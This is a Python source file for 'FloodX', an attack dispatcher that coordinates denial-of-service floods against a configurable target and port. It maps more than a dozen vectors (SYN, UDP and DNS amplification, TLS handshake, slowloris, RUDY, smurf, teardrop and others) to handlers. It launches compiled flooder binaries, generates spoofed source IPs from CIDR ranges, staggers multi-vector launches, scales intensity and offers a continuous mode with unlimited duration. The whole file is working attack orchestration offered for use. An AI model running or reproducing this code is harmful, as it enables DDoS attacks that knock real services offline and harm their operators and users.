"""
FloodX: Attack Dispatcher
Orchestrates multi-vector attacks and coordinates between different language modules.
"""

import asyncio
import subprocess
import sys
import os
import time
import random
import ipaddress
from pathlib import Path
from typing import Dict, Any, List, Optional, Callable
from concurrent.futures import ThreadPoolExecutor

# Add parent directory to Python path for proper imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from common.logger import logger, log_attack_start, log_attack_end, stats_logger
from orchestrator.proxy_manager import ProxyManager
from orchestrator.monitor import AttackMonitor



class AttackDispatcher:
    """Coordinates and dispatches various attack vectors."""
    
    def __init__(self):
        self.running = False
        self.active_processes = []
        self.executor = ThreadPoolExecutor(max_workers=10)
        
        # Attack vector mappings
        self.vector_handlers = {
            'syn': self._dispatch_syn_flood,
            'udp': self._dispatch_udp_flood,
            'icmp': self._dispatch_icmp_flood,
            'http': self._dispatch_http_flood,
            'websocket': self._dispatch_websocket_flood,
            'tls': self._dispatch_tls_flood,
            'dns': self._dispatch_dns_flood,
            'slowloris': self._dispatch_slowloris_attack,
            'rudy': self._dispatch_rudy_attack,
            'ping_of_death': self._dispatch_ping_of_death,
            'smurf': self._dispatch_smurf_attack,
            'teardrop': self._dispatch_teardrop_attack,
            'dns_amplification': self._dispatch_dns_amplification,
            'smtp': self._dispatch_smtp_flood,
            'continuous': self._dispatch_continuous_attack,
            'multi_vector': self._dispatch_multi_vector_attack
        }
        
        # Binary paths (will be auto-detected)
        self.binary_paths = self._detect_binaries()

    def _detect_binaries(self) -> Dict[str, Optional[Path]]:
        """Auto-detect available attack binaries."""
        binaries = {}
        
        # Check for C/C++ binaries
        bin_dir = Path("bin")
        if sys.platform.startswith('win'):
            bin_subdir = bin_dir / "windows"
            extensions = ['.exe']
        else:
            bin_subdir = bin_dir / "linux"
            extensions = ['']
        
        # Look for compiled binaries
        for vector in ['syn_flooder', 'udp_amplification', 'icmp_flooder', 'teardrop']:
            for ext in extensions:
                binary_path = bin_subdir / f"{vector}{ext}"
                if binary_path.exists():
                    binaries[vector] = binary_path
                    logger.debug(f"🔍 Found binary: {binary_path}")
        
        # Check for Go binaries
        go_binaries = ['websocket_client_flood', 'tls_handshake_flood', 'vector_attacks']
        for binary in go_binaries:
            for ext in extensions:
                binary_path = bin_subdir / f"{binary}{ext}"
                if binary_path.exists():
                    binaries[binary] = binary_path
                    logger.debug(f"🔍 Found Go binary: {binary_path}")
        
        return binaries

    async def dispatch(self, config: Dict[str, Any]):
        """Main dispatch method for unified entry point."""
        # Validate configuration
        if not await self.validate_config(config):
            raise ValueError("Invalid configuration")
        
        vector = config['vector']
        
        if vector == 'multi' or vector == 'all':
            # Multi-vector attack
            if 'vectors' in config:
                await self._run_multi_vector_coordinated(config)
            else:
                await self.run_multi_vector_attack(config)
        else:
            # Single vector attack
            await self.run_single_vector_attack(config)
    
    async def _run_multi_vector_coordinated(self, config: Dict[str, Any]):
        """Run coordinated multi-vector attack with specific vectors."""
        vectors = config['vectors']
        intensity = config.get('intensity', 'moderate')
        
        # Intensity profiles
        intensity_profiles = {
            'light': {'duration_multiplier': 0.5, 'concurrency_multiplier': 0.3},
            'moderate': {'duration_multiplier': 1.0, 'concurrency_multiplier': 1.0},
            'full': {'duration_multiplier': 1.5, 'concurrency_multiplier': 2.0}
        }
        
        profile = intensity_profiles.get(intensity, intensity_profiles['moderate'])
        
        # Adjust base parameters
        base_duration = config['duration']
        base_concurrency = config['concurrency']
        
        config['duration'] = int(base_duration * profile['duration_multiplier'])
        config['concurrency'] = int(base_concurrency * profile['concurrency_multiplier'])
        
        logger.info(f"🚀 Launching {intensity} intensity multi-vector attack with {len(vectors)} vectors")
        
        # Create tasks for each vector
        tasks = []
        concurrency_per_vector = max(1, config['concurrency'] // len(vectors))
        
        for i, vector in enumerate(vectors):
            if vector in self.vector_handlers:
                vector_config = config.copy()
                vector_config['vector'] = vector
                vector_config['concurrency'] = concurrency_per_vector
                
                # Stagger attacks by 2-5 seconds
                delay = random.uniform(2, 5)
                task = asyncio.create_task(
                    self._run_vector_with_delay(vector_config, delay)
                )
                tasks.append(task)
        
        try:
            self.running = True
            await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            self.running = False

    async def validate_config(self, config: Dict[str, Any]) -> bool:
        """Validate attack configuration."""
        try:
            # Basic validation
            required_fields = ['target', 'vector', 'port', 'duration', 'concurrency']
            for field in required_fields:
                if field not in config:
                    logger.error(f"❌ Missing required field: {field}")
                    return False
            
            # Validate target
            target = config['target']
            try:
                ipaddress.ip_address(target)
            except ValueError:
                # It's a hostname, basic validation
                if not target or len(target) > 255:
                    logger.error(f"❌ Invalid target hostname: {target}")
                    return False
            
            # Validate port
            port = config['port']
            if not (1 <= port <= 65535):
                logger.error(f"❌ Invalid port: {port}")
                return False
            
            # Validate vector
            vector = config['vector']
            if vector != 'all' and vector not in self.vector_handlers:
                logger.error(f"❌ Unknown attack vector: {vector}")
                return False
            
            # Validate concurrency
            concurrency = config['concurrency']
            if concurrency < 1 or concurrency > 100000:
                logger.error(f"❌ Invalid concurrency: {concurrency}")
                return False
            
            # Validate duration
            duration = config['duration']
            if duration < 1 or duration > 7200:  # Max 2 hours
                logger.error(f"❌ Invalid duration: {duration}")
                return False
            
            logger.info("✅ Attack configuration validated successfully")
            return True
            
        except Exception as e:
            logger.error(f"❌ Configuration validation failed: {e}")
            return False

    async def run_single_vector_attack(self, config: Dict[str, Any]):
        """Execute a single attack vector."""
        vector = config['vector']
        
        if vector not in self.vector_handlers:
            raise ValueError(f"Unknown attack vector: {vector}")
        
        log_attack_start(config['target'], vector, config['port'], config['duration'])
        
        # Update stats logger
        stats_logger.update_stats(
            target=config['target'],
            vector=vector,
            status='running'
        )
        
        try:
            self.running = True
            handler = self.vector_handlers[vector]
            await handler(config)
            
        except Exception as e:
            logger.error(f"❌ Attack vector {vector} failed: {e}")
            stats_logger.update_stats(status='failed', errors=stats_logger.stats['errors'] + 1)
        finally:
            self.running = False
            stats_logger.update_stats(status='completed')

    async def run_multi_vector_attack(self, config: Dict[str, Any]):
        """Execute multiple attack vectors concurrently."""
        logger.info("🚀 Starting multi-vector attack")
        
        # Determine vectors to use
        vectors = ['syn', 'udp', 'icmp', 'http', 'websocket', 'tls', 'dns', 'slowloris']
        
        # Apply profile if specified
        if 'profile' in config and config['profile']:
            from config import get_attack_profile
            profile = get_attack_profile(config['profile'])
            if profile and 'vectors' in profile:
                vectors = profile['vectors']
        
        # Adjust concurrency per vector
        total_concurrency = config['concurrency']
        concurrency_per_vector = max(1, total_concurrency // len(vectors))
        
        logger.info(f"📊 Launching {len(vectors)} vectors with {concurrency_per_vector} concurrency each")
        
        # Update stats
        stats_logger.update_stats(
            target=config['target'],
            vector='multi-vector',
            status='running'
        )
        
        # Create tasks for each vector
        tasks = []
        for vector in vectors:
            if vector in self.vector_handlers:
                vector_config = config.copy()
                vector_config['vector'] = vector
                vector_config['concurrency'] = concurrency_per_vector
                
                task = asyncio.create_task(
                    self._run_vector_with_delay(vector_config, random.uniform(0, 2))
                )
                tasks.append(task)
        
        try:
            self.running = True
            # Wait for all vectors to complete
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception as e:
            logger.error(f"❌ Multi-vector attack failed: {e}")
        finally:
            self.running = False
            stats_logger.update_stats(status='completed')

    async def _run_vector_with_delay(self, config: Dict[str, Any], delay: float):
        """Run a vector with initial delay for staggered start."""
        await asyncio.sleep(delay)
        vector = config['vector']
        
        try:
            handler = self.vector_handlers[vector]
            await handler(config)
        except Exception as e:
            logger.error(f"❌ Vector {vector} failed: {e}")

    async def _dispatch_syn_flood(self, config: Dict[str, Any]):
        """Dispatch SYN flood attack."""
        logger.info("🌊 Starting SYN flood attack")
        
        # Try to use compiled binary first
        if 'syn_flooder' in self.binary_paths:
            await self._run_binary_attack('syn_flooder', config)
            return
        
        # Fallback to Python implementation
        from app_layer_attacks.syn_flooder import SynFlooder
        flooder = SynFlooder(config)
        await flooder.run()

    async def _dispatch_udp_flood(self, config: Dict[str, Any]):
        """Dispatch UDP amplification attack."""
        logger.info("📡 Starting UDP amplification attack")
        
        if 'udp_amplification' in self.binary_paths:
            await self._run_binary_attack('udp_amplification', config)
            return
        
        # Fallback to Python implementation
        from app_layer_attacks.udp_amplifier import UdpAmplifier
        amplifier = UdpAmplifier(config)
        await amplifier.run()

    async def _dispatch_icmp_flood(self, config: Dict[str, Any]):
        """Dispatch ICMP flood attack."""
        logger.info("🏓 Starting ICMP flood attack")
        
        if 'icmp_flooder' in self.binary_paths:
            await self._run_binary_attack('icmp_flooder', config)
            return
        
        # Python fallback
        from app_layer_attacks.icmp_flooder import IcmpFlooder
        flooder = IcmpFlooder(config)
        await flooder.run()

    async def _dispatch_http_flood(self, config: Dict[str, Any]):
        """Dispatch HTTP flood attack."""
        logger.info("🌐 Starting HTTP flood attack")
        
        from app_layer_attacks.http_flooder import HttpFlooder
        flooder = HttpFlooder(config)
        await flooder.run()

    async def _dispatch_websocket_flood(self, config: Dict[str, Any]):
        """Dispatch WebSocket flood attack."""
        logger.info("🔌 Starting WebSocket flood attack")
        
        # Try Go binary first
        if 'websocket_client_flood' in self.binary_paths:
            await self._run_binary_attack('websocket_client_flood', config)
            return
        
        # Python fallback
        from app_layer_attacks.websocket_storm import WebSocketStorm
        storm = WebSocketStorm(config)
        await storm.run()

    async def _dispatch_tls_flood(self, config: Dict[str, Any]):
        """Dispatch TLS handshake flood attack."""
        logger.info("🔐 Starting TLS handshake flood attack")
        
        if 'tls_handshake_flood' in self.binary_paths:
            await self._run_binary_attack('tls_handshake_flood', config)
            return
        
        # Python fallback
        from app_layer_attacks.tls_handshake_flooder import TlsHandshakeFlooder
        flooder = TlsHandshakeFlooder(config)
        await flooder.run()

    async def _dispatch_dns_flood(self, config: Dict[str, Any]):
        """Dispatch DNS flood attack."""
        logger.info("🔍 Starting DNS flood attack")
        
        from dns_utils.dns_flooder import DnsFlooder
        flooder = DnsFlooder(config)
        await flooder.run()

    async def _dispatch_slowloris_attack(self, config: Dict[str, Any]):
        """Dispatch Slowloris attack."""
        logger.info("🐌 Starting Slowloris attack")
        
        from app_layer_attacks.slowloris import SlowlorisFlooder
        flooder = SlowlorisFlooder(config)
        await flooder.run()

    async def _dispatch_rudy_attack(self, config: Dict[str, Any]):
        """Dispatch RUDY (R-U-Dead-Yet) attack."""
        logger.info("🐌 Starting RUDY attack")
        
        from app_layer_attacks.slowloris import RudyFlooder
        flooder = RudyFlooder(config)
        await flooder.run()

    async def _dispatch_ping_of_death(self, config: Dict[str, Any]):
        """Dispatch Ping of Death attack."""
        logger.info("💀 Starting Ping of Death attack")
        
        from app_layer_attacks.icmp_flooder import PingOfDeathAttack
        flooder = PingOfDeathAttack(config)
        await flooder.run()

    async def _dispatch_smurf_attack(self, config: Dict[str, Any]):
        """Dispatch Smurf attack."""
        logger.info("🌊 Starting Smurf attack")
        
        from app_layer_attacks.icmp_flooder import SmurfAttack
        flooder = SmurfAttack(config)
        await flooder.run()

    async def _dispatch_teardrop_attack(self, config: Dict[str, Any]):
        """Dispatch Teardrop fragmentation attack."""
        logger.info("💥 Starting Teardrop fragmentation attack")
        
        from app_layer_attacks.teardrop_flooder import TeardropFlooder
        flooder = TeardropFlooder(config)
        await flooder.run()

    async def _dispatch_dns_amplification(self, config: Dict[str, Any]):
        """Dispatch advanced DNS amplification attack."""
        logger.info("📡 Starting advanced DNS amplification attack")
        
        from dns_utils.dns_amplification_advanced import AdvancedDnsAmplificationAttack
        flooder = AdvancedDnsAmplificationAttack(config)
        await flooder.run()

    async def _dispatch_smtp_flood(self, config: Dict[str, Any]):
        """Dispatch advanced SMTP flood attack."""
        logger.info("📧 Starting advanced SMTP flood attack")
        
        from app_layer_attacks.smtp_flood import AdvancedSmtpFloodAttack
        flooder = AdvancedSmtpFloodAttack(config)
        await flooder.run()

    async def _run_binary_attack(self, binary_name: str, config: Dict[str, Any]):
        """Run compiled binary attack."""
        binary_path = self.binary_paths[binary_name]
        
        # Build command arguments
        cmd = [
            str(binary_path),
            '--target', config['target'],
            '--port', str(config['port']),
            '--duration', str(config['duration']),
            '--concurrency', str(config['concurrency'])
        ]
        
        # Add spoofing if enabled
        if config.get('spoof_ip'):
            cmd.extend(['--spoof'])
            if config.get('spoof_ranges'):
                for range_str in config['spoof_ranges']:
                    cmd.extend(['--spoof-range', str(range_str)])
        
        logger.info(f"🚀 Executing: {' '.join(cmd)}")
        
        try:
            # Run the binary
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            self.active_processes.append(process)
            
            # Monitor output
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                logger.info(f"✅ Binary {binary_name} completed successfully")
                if stdout:
                    logger.debug(f"Output: {stdout.decode()}")
            else:
                logger.error(f"❌ Binary {binary_name} failed with code {process.returncode}")
                if stderr:
                    logger.error(f"Error: {stderr.decode()}")
            
        except Exception as e:
            logger.error(f"❌ Failed to run binary {binary_name}: {e}")
        finally:
            if process in self.active_processes:
                self.active_processes.remove(process)

    def generate_spoofed_ips(self, 
                           ranges: List[ipaddress.IPv4Network], 
                           count: int) -> List[str]:
        """Generate random spoofed IP addresses from CIDR ranges."""
        spoofed_ips = []
        
        for _ in range(count):
            # Pick a random range
            network = random.choice(ranges)
            
            # Generate random IP within the range
            network_int = int(network.network_address)
            broadcast_int = int(network.broadcast_address)
            random_int = random.randint(network_int, broadcast_int)
            
            spoofed_ip = str(ipaddress.IPv4Address(random_int))
            spoofed_ips.append(spoofed_ip)
        
        return spoofed_ips

    async def _dispatch_continuous_attack(self, config: Dict[str, Any]):
        """Dispatch continuous attack with intelligent randomization."""
        logger.info("🔄 Starting continuous attack engine")
        
        from orchestrator.continuous_engine import ContinuousAttackEngine
        
        # Enhance config for continuous mode
        continuous_config = config.copy()
        continuous_config.update({
            'continuous': True,
            'restart_interval': config.get('restart_interval', 30),
            'randomization_level': config.get('randomization_level', 'high'),
            'spoof_ip': config.get('spoof_ip', True),
            'duration': config.get('duration', 0)  # 0 = infinite
        })
        
        engine = ContinuousAttackEngine(continuous_config)
        await engine.run()

    async def _dispatch_multi_vector_attack(self, config: Dict[str, Any]):
        """Dispatch coordinated multi-vector attack."""
        logger.info("🎯 Starting multi-vector coordinated attack")
        
        from orchestrator.multi_vector import MultiVectorCoordinator
        
        # Enhance config for multi-vector mode
        multi_config = config.copy()
        multi_config.update({
            'vectors': config.get('vectors', ['syn', 'http', 'tls', 'dns']),
            'coordination_mode': config.get('coordination_mode', 'adaptive'),
            'vector_rotation': config.get('vector_rotation', True),
            'dynamic_adjustment': config.get('dynamic_adjustment', True)
        })
        
        coordinator = MultiVectorCoordinator(multi_config)
        await coordinator.run()

    async def stop_all_attacks(self):
        """Stop all running attacks."""
        logger.info("🛑 Stopping all active attacks...")
        self.running = False
        
        # Terminate active processes
        for process in self.active_processes[:]:
            try:
                process.terminate()
                await asyncio.wait_for(process.wait(), timeout=5.0)
            except asyncio.TimeoutError:
                logger.warning(f"⚠️  Force killing process {process.pid}")
                process.kill()
            except Exception as e:
                logger.error(f"❌ Error stopping process: {e}")
        
        self.active_processes.clear()
        logger.info("✅ All attacks stopped")

    def get_attack_status(self) -> Dict[str, Any]:
        """Get current attack status."""
        return {
            'running': self.running,
            'active_processes': len(self.active_processes),
            'available_binaries': list(self.binary_paths.keys()),
            'supported_vectors': list(self.vector_handlers.keys())
        }

    async def __aenter__(self):
        """Async context manager entry."""
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        await self.stop_all_attacks()
